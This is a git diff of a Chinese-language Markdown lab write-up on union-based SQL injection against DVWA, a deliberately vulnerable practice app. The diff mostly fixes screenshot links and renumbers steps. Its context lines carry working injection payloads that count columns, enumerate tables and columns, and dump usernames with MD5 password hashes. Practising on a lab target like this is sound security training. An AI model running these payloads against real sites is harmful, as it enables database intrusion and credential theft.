@@ -31,6 +31,9 @@ Web 服务：Apache 2.4 + MySQL (MariaDB) + PHP 8.2
 ![代码](screenshots/2.png)
 
 ![1'](screenshots/3.png)
+
+![1'报错](screenshots/10.png)
+
 2. 判断字段数
 
 使用 ORDER BY 猜测原查询的列数：
@@ -41,31 +44,35 @@ text
 1' ORDER BY 3#   → 报错
 得出字段数为 2。
 
-https://screenshots/4.png
+![字段](screenshots/4.png)
 
 3. 获取当前数据库名和用户
 text
 1' UNION SELECT database(), user()#
 返回：dvwa 和 root@localhost。
 
-https://screenshots/5.png
+![字段](screenshots/5.png)
 
 4. 获取所有表名
 text
 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
-得到表：guestbook, users。 
-https://screenshots/6.png 
-5. 获取 users 表的列名
+得到表：guestbook, users。
+
+![字段](screenshots/6.png)
+
+6. 获取 users 表的列名
 text
 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
 关键列：user, password。
-https://screenshots/7.png
-6. 导出用户名和密码
+
+![字段](screenshots/7.png)
+
+8. 导出用户名和密码
 text
 1' UNION SELECT user, password FROM users#
 结果：
-https://screenshots/8.png
-https://screenshots/9.png
+![字段](screenshots/8.png)
+![字段](screenshots/9.png)
 user	password (MD5)
 admin	5f4dcc3b5aa765d61d8327deb882cf99
 gordonb	e99a18c428cb38d5f260853678922e03
